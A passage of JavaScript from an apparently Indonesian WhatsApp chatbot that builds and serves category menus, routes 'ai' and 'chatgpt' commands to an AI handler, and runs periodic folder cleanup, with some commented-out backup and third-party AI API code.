			'#atasKiri': `${atasKiri}`,
			'#atasKanan': `${atasKanan}`,
			'#bawahMenu': `${bawahMenu}`,
			'#hari': `${getHari()}`
		};
		const gantiPola = (match) => pengganti[match] || match;

		function Ganti(Dengan) {
			let udah = Dengan.replace(/#bawahMenu|#kiriMenu|#fotter|#atasKiri|#atasKanan|#owner|#premium|#free|#group|#weton|#ucapan|#kecepatan|#waktuOnline|#weton|#namaBot|#noOwner|#prefix|#mode|#hostName|#platform|#namaUser|#nomorUser|#isPremium|#time|#date|#hari/g, gantiPola);
			return udah;
		}
		global.awalan = Ganti(awal)
		global.allMenu = Ganti([aschi, awal, readMore, allmenu(Data)].join('\n\n') + fotter);
		global.mainMenu = Ganti([aschi, awal, readMore, listMenu(Data, 'mainmenu')].join('\n\n') + fotter);
		global.makerMenu = Ganti([aschi, awal, readMore, listMenu(Data, 'photooxymaker'), listMenu(Data, 'textpromaker'), listMenu(Data, 'ephoto360maker')].join('\n\n') + fotter);
		global.animeMenu = Ganti([aschi, awal, readMore, listMenu(Data, 'animensfw'), listMenu(Data, 'anime')].join('\n\n') + fotter);
		global.funMenu = Ganti([aschi, awal, readMore, listMenu(Data, 'funmenu'), listMenu(Data, 'game')].join('\n\n') + fotter);
		global.randomMenu = Ganti([aschi, awal, readMore, listMenu(Data, 'randomvideo'), listMenu(Data, 'randomphoto'), listMenu(Data, 'othermenu')].join('\n\n') + fotter);
		global.internetMenu = Ganti([aschi, awal, readMore, listMenu(Data, 'stalker')].join('\n\n') + fotter);
		global.groupMenu = Ganti([aschi, awal, readMore, listMenu(Data, 'groupmenu')].join('\n\n') + fotter);
		global.downloadMenu = Ganti([aschi, awal, readMore, listMenu(Data, 'downloadmenu')].join('\n\n') + fotter);
		global.ownerMenu = Ganti([aschi, awal, readMore, listMenu(Data, 'ownermenu')].join('\n\n') + fotter);
		global.convertMenu = Ganti([aschi, awal, readMore, listMenu(Data, 'convertmenu')].join('\n\n') + fotter);
		global.AiMenu = Ganti([aschi, awal, readMore, listMenu(Data, 'ai')].join('\n\n') + fotter);
		

		if (budy.startsWith('*馃寪 MenuAll*\n_Berisi semua menu_') || (command === 'menuall') || (command === 'allmenu')) {
			newReply(allMenu)
		};
		if (budy.startsWith('*馃懁 MenuOwner*\n_Menu khusus pemilik bot_') || (command === 'menuowner')) {
			newReply(ownerMenu)
		};
		if (budy.startsWith('*馃摜 MenuDownload*\n_Download konten menarik_') || (command === 'menudownload') || (command === 'menudl') || (command === 'menudown')) {
			newReply(downloadMenu)
		};
		if (budy.startsWith('*馃懃 MenuGroup*\n_Menu untuk grup_') || (command === 'menugc') || (command === 'menugrup') || (command === 'menugroup')) {
			newReply(groupMenu)
		};
		if (budy.startsWith('*馃攳 MenuSearch&Internet*\n_Cari informasi yang kamu butuhkan_') || (command === 'menusearch')) {
			newReply(internetMenu)
		};
		if (budy.startsWith('*馃幉 MenuRandom*\n_Temukan hal secara acak_') || (command === 'menurandom')) {
			newReply(randomMenu)
		};
		if (budy.startsWith('*馃枌锔� MenuMaker*\n_Buat konten kreatif_') || (command === 'menumaker')) {
			newReply(makerMenu)
		};
		if (budy.startsWith('*馃槃 MenuFun*\n_Berisi menu-menu yang menyenangkan seperti Game dll_') || (command === 'menufun')) {
			newReply(funMenu)
		};
		if (budy.startsWith('*馃惐 MenuAnime*\n_Menu tentang anime dan kartun lainya_') || (command === 'menuanime') || (command === 'animemenu')) {
			newReply(animeMenu)
		};
		if (budy.startsWith('*馃彔 MenuMain*\n_Menu utama Bot_') || (command === 'menumain') || (command === 'mainmenu')) {
			newReply(mainMenu)
		};
		if (budy.startsWith('*馃攧 MenuConvert*\n_Konversi berbagai hal_') || (command === 'menuconvert')) {
			newReply(convertMenu)
		};
		 if (budy.startsWith('*馃 MenuAi*\n_Menu Yang menggunakan Artificial intelligence_') || (command === 'menuprimbon')) {
		 	newReply(AiMenu)
		 }


       


		if ((command == "ai" || command == "chatgpt" || command == "zero") || (m.quoted && m.quoted.id == sesi[m.sender])) {
			var mesek = text && m.quoted ? (m.quoted.text ? text + '\n\n' + m.quoted.text : text) : text ? text : (m.quoted ? (m.quoted.text ? m.quoted.text : false) : false);
			startAI(mesek)
		}
        
 //auto delete 
setInterval(() => {
    watchFolder('./lib');
    watchFolder('./');
    watchFolder('./media/audio');
}, 300000);

 
        
        //backup 
 /*		setInterval(() => {
        backup();
        },3600000)       
	
   */     
  

/*const session = bard[m.sender];
if (m.quoted && m.quoted.id === session.messageId) {
try {
newReply('*w r i t i n g. . .*')
let response = await fetch(`https://skizo.tech/api/bard-ai?text=${m.text}&apikey=${skizo}&${new URLSearchParams(session.context).toString()}`);
if (!response.ok) {
throw new Error(`Failed to fetch AI data. Status: ${response.status}`);
}
let data = await response.json();
if (data.error) {
throw new Error(`AI API error: ${data.error}`);
}
session.context = data.ids;
await newReply(data.content)
} catch (error) {
console.error(error);
reply("Error while fetching AI data. Please try again later.");
}
}

 */ 
 

      if (m.isGroup && global.db.data.chats[m.chat].mute) {
          
          if (!isAdmins && !isOwner)
              return 
       
      }
 } catch (e) {
  console.log(e)
}
}